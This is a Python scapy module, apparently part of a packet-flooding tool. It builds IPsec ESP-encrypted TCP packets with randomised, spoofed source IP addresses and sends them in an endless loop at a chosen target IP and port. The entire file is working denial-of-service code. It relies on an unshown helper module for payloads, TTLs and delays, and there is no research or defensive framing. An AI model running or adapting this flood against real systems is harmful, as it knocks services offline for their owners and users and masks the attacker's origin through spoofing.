from scapy.all import IP, TCP, send, RandIP, RandShort, SecurityAssociation, ESP
from sys import path
path.append("..")
import packet_builder

def build_ipsec_packet(destination_ip, destination_port):
    """Generate encrypted packet with spoofed source IP address.

    Arguments:
    destination_ip -- the IP address of the target
    destination_port -- the targets port to which the packet will be sent 
    
    """
    sa = SecurityAssociation(ESP, spi=0, crypt_algo='Blowfish', crypt_key=b'16byteskey', auth_algo='NULL', auth_key=None)

    return sa.encrypt(IP(src=RandIP(), dst=destination_ip, id=RandShort(), ttl=packet_builder.generate_ttl())/TCP(sport=RandShort(), dport=destination_port)/packet_builder.generate_payload())

def start_ipsec_flood(destination_ip, destination_port):
    """Continuously send IPSec packets"""
    try:
        while True:
            send(build_ipsec_packet(destination_ip, destination_port), packet_builder.generate_delay_for_packet())
    except KeyboardInterrupt:
        print("...Exiting...")